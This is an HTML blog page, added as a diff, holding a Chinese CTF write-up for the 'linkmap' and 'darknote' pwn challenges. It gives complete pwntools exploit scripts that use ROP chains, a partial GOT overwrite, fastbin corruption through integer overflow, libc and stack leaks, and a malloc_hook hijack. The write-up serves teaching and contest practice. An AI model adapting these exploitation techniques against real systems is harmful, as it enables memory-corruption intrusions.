@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="linkmapmain函数栈溢出，但是没有可以泄露的常规方法 使用ropper可以发现一段gadget 0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret;   .text:000000000040076D B">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 巅峰极客 pwn">
+<meta property="og:url" content="https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="linkmapmain函数栈溢出，但是没有可以泄露的常规方法 使用ropper可以发现一段gadget 0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret;   .text:000000000040076D B">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-25T15:04:53.000Z">
+<meta property="article:modified_time" content="2023-07-28T10:18:49.138Z">
+<meta property="article:author" content="bxz">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 巅峰极客 pwn</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/07/29/House-Of-Einherjar/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/07/24/2023-DASCTF-0X401/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&text=2023 巅峰极客 pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&is_video=false&description=2023 巅峰极客 pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 巅峰极客 pwn&body=Check out this article: https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&name=2023 巅峰极客 pwn&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&t=2023 巅峰极客 pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#linkmap"><span class="toc-number">1.</span> <span class="toc-text">linkmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#darknote"><span class="toc-number">1.1.</span> <span class="toc-text">darknote</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2023 巅峰极客 pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-25T15:04:53.000Z" itemprop="datePublished">2023-07-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p>main函数栈溢出，但是没有可以泄露的常规方法</p>
+<p>使用ropper可以发现一段gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040076</span>D B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000400772</span> C9                            leave</span><br><span class="line">.text:<span class="number">0000000000400773</span> C3                            retn</span><br></pre></td></tr></table></figure>
+
+<p>main函数返回时mov eax，0所以可以利用这段gadget把rbp - 8处的数据读到0x601020 .bss处</p>
+<ul>
+<li><p>把read的got读到0x601020附近</p>
+</li>
+<li><p>把读到bss段的read最后一位改为0x90 即syscall地址</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble read</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __GI___libc_read:</span><br><span class="line">   <span class="number">0x00007fb1a3514980</span> &lt;+<span class="number">0</span>&gt;:     endbr64</span><br><span class="line">   <span class="number">0x00007fb1a3514984</span> &lt;+<span class="number">4</span>&gt;:     mov    eax,DWORD PTR fs:<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x00007fb1a351498c</span> &lt;+<span class="number">12</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x00007fb1a351498e</span> &lt;+<span class="number">14</span>&gt;:    jne    <span class="number">0x7fb1a35149a0</span> &lt;__GI___libc_read+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x00007fb1a3514990</span> &lt;+<span class="number">16</span>&gt;:    syscall</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用gadget控制参数执行调用号为0x3B的sys_execve系统调用</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ezzzz&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400772&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400768&#x27;)</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x0400570</span></span><br><span class="line">pop_rdi=<span class="number">0x04007e3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x04007e1</span></span><br><span class="line">leave_ret=<span class="number">0x0400712</span></span><br><span class="line">bss_data=<span class="number">0x601020</span></span><br><span class="line">gadget=<span class="number">0x000000000040066b</span> <span class="comment">#0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">binsh=bss_data+<span class="number">100</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload=flat(padding,pop_rbp_ret,read_got+<span class="number">8</span>,gadget,<span class="number">0</span>)<span class="comment">#read函数地址写入bss段</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,bss_data,<span class="number">0</span>,read_plt)<span class="comment">#最后一位改为0x90</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,binsh,<span class="number">0</span>,read_plt)<span class="comment">#读入binsh同时设置系统调用号</span></span><br><span class="line">payload+=flat(pop_rdi,binsh,pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">rop.migrate(bss_data)<span class="comment">#栈迁移到bss_data，rop</span></span><br><span class="line">payload+=rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#改为0x90</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3b</span>-<span class="number">8</span>))<span class="comment">#设置eax为execve调用号0x3b</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里最后时<code> syscall  &lt;SYS_execve&gt;</code>rsi参数需要为0，rdx不必需</p>
+<p>除了栈迁移还可用csu里的gadget来执行到syscall</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007C0 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:00000000004007C3 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:00000000004007C6 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:00000000004007C9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004007C9</span><br><span class="line">.text:00000000004007CD 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:00000000004007D1 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:00000000004007D4 75 EA                         jnz     short loc_4007C0</span><br><span class="line">.text:00000000004007D4</span><br><span class="line">.text:00000000004007D6</span><br><span class="line">.text:00000000004007D6                               loc_4007D6:                             ; CODE XREF: init+34↑j</span><br><span class="line">.text:00000000004007D6 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:00000000004007DA 5B                            pop     rbx</span><br><span class="line">.text:00000000004007DB 5D                            pop     rbp</span><br><span class="line">.text:00000000004007DC 41 5C                         pop     r12</span><br><span class="line">.text:00000000004007DE 41 5D                         pop     r13</span><br><span class="line">.text:00000000004007E0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004007E2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004007E4 C3                            retn</span><br></pre></td></tr></table></figure>
+
+<h3 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h3><p>只有add功能可以用，其他功能需要canary为0才可以，基本不可能</p>
+<p>下面的函数存在整数溢出</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;How many dark notes do you want?&quot;</span>);</span><br><span class="line">note_count = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **))read_num)(<span class="string">&quot;How many dark notes do you want?&quot;</span>, a2);</span><br><span class="line">note_ptr_ar = <span class="built_in">malloc</span>(<span class="number">8</span> * note_count);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">index_add = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, _BYTE *))read_num)(<span class="string">&quot;Index: &quot;</span>, v3);</span><br><span class="line"><span class="keyword">if</span> ( index_add &gt;= <span class="number">0</span> &amp;&amp; index_add &lt; note_count )</span><br><span class="line">&#123;</span><br><span class="line">    v6 = (<span class="type">void</span> **)((<span class="type">char</span> *)note_ptr_ar + <span class="number">8</span> * index_add);</span><br><span class="line">    *v6 = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br></pre></td></tr></table></figure>
+
+<p>note_count*8后如果溢出，会导致申请的堆块小于<code> v6 = (void **)((char *)note_ptr_ar + 8 * index_add); *v6 = malloc(0x68uLL);</code>可写的堆块，所以我们利用mmap申请到libc上方的堆块，就可以往libc写我们申请的堆地址</p>
+<p>思路</p>
+<ul>
+<li>把我们申请堆的地址写入到 main_arena.fastbin[5]的位置，我们就可以在申请堆伪造下一个堆，造成任意堆的申请</li>
+<li>利用输出菜单函数泄露libc</li>
+<li>利用存储着系统的环境变量的__environ泄露stack地址</li>
+<li>在stack上布置rop链</li>
+<li>malloc_hook改为触发rop链的gadget</li>
+</ul>
+<p>任意堆申请时要注意申请的任意堆的fd域即任意堆地址+0x10处要为0，不然过不了检测</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./darknote&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401AFF&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, note</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Note: &#x27;</span>, note)</span><br><span class="line"><span class="comment">#mmap 0x7f82cbc1c010</span></span><br><span class="line">sla(<span class="string">b&#x27;do you want?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"><span class="comment">#pwndbg&gt; p &amp;main_arena.fastbinsY[5]</span></span><br><span class="line"><span class="comment">#$1 = (mfastbinptr *) 0x7f82cc009bb8 &lt;main_arena+56&gt;</span></span><br><span class="line"><span class="comment">#distance 0x7f82cc009bb8  0x7f82cbc1c010</span></span><br><span class="line"><span class="comment">#0x7f82cc009bb8-&gt;0x7f82cbc1c010 is -0x3edba8 bytes (-0x7db75 words)</span></span><br><span class="line">fast_5=<span class="number">0x3edba8</span>&gt;&gt;<span class="number">3</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,flat(<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=puts_ad-libcelf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">environ = libcbase + libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">malloc_hook=libcbase+libcelf.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">syscall=libcbase+libcelf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">write=libcbase+libcelf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=libcbase+libcelf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,flat(<span class="number">0</span>,<span class="number">0</span>,environ))</span><br><span class="line">rl()</span><br><span class="line">stack=uu64(r(<span class="number">6</span>))-<span class="number">0x98</span></span><br><span class="line">p(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">pop_pop=<span class="number">0x0000000000401dbb</span></span><br><span class="line">ropstart=libcbase+<span class="number">0x00000000000ddc57</span></span><br><span class="line"><span class="comment"># 0x00000000000ddc57 : add rsp, 0xe0 ; pop rbx ; ret </span></span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,stack-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401dc3</span></span><br><span class="line">pop_rsi_ret = libcbase + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libcbase + <span class="number">0x0000000000142c92</span></span><br><span class="line">ropread=flat(<span class="number">0</span>,<span class="number">0</span>,pop_rdi_ret,<span class="number">0</span>,pop_rsi_ret,bss+<span class="number">0x100</span>,pop_rdx_ret,<span class="number">0x300</span>,elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop.migrate(bss+<span class="number">0x100</span>)</span><br><span class="line">ropread+=rop.chain()</span><br><span class="line">add(<span class="number">1</span>,ropread)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(ropstart))</span><br><span class="line">db(<span class="string">&#x27;b *__malloc_hook&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">flagstr=bss+<span class="number">0x100</span>+<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span></span><br><span class="line">orw=flat(pop_rdi_ret,<span class="number">2</span>,pop_rsi_ret,flagstr,pop_rdx_ret,<span class="number">0</span>,syscall)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">3</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,read)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">1</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,write)</span><br><span class="line">orw.ljust(<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw+=<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">sl(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#linkmap"><span class="toc-number">1.</span> <span class="toc-text">linkmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#darknote"><span class="toc-number">1.1.</span> <span class="toc-text">darknote</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
